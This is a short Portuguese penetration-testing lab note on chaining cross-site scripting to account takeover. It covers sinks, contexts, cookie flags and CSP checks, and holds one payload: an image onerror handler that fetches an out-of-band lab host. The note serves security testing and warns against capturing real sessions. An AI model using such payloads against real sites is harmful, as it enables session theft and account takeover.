# XSS até account takeover — lab

Sandbox throwaway — XSS até account takeover sem ruído de cliente.

## Contexto

XSS moderno raramente é `alert(1)`: o valor está em roubo de sessão, bypass de CSRF,
abuso de WebMessages e chain com CSP bypass. DOM XSS exige data flow (source→sink) real.

## Variante

- Se não validar **CSRF token theft**, a nota fica genérica.
- Sink + contexto + cookie flags. Encadeio até ação autenticada ou token se HttpOnly falhar.
- Recurso claimável + prova de controle (arquivo/challenge). Sem claim, não é Critical.

## Setup

Ativo mínimo. Duas identidades se for authz.
Restore point.

## Fluxo

1. Mapeio reflections e sinks DOM (innerHTML, location, postMessage).
2. Testo contextos (HTML, attr, JS, URL, CSS).
3. Avalio cookies HttpOnly e CSP.
4. Construir PoC de impacto (sessão de teste / ação).
5. Verifico mutação por sanitizers (DOMPurify misconfig).

## No lab ficou assim

```html
<!-- reflected/stored lab payload — sem persistir em prod -->
<img src=x onerror="fetch('https://oast.lab.local/4fa20a')">
<!-- sink ato-chain: sessão USER_A / cookie flags -->
```

## Pitfall

Não capture sessões de usuários reais. Evito defacement.

XSS/CSRF: preciso do sink e da condição de auth. alert(1) sem abuso de sessão é demo.

## Prova do lab

PoC HTML; cookie flags; impacto narrado.

## Refs

- PortSwigger XSS
- OWASP XSS
- WSTG-INPV-01/02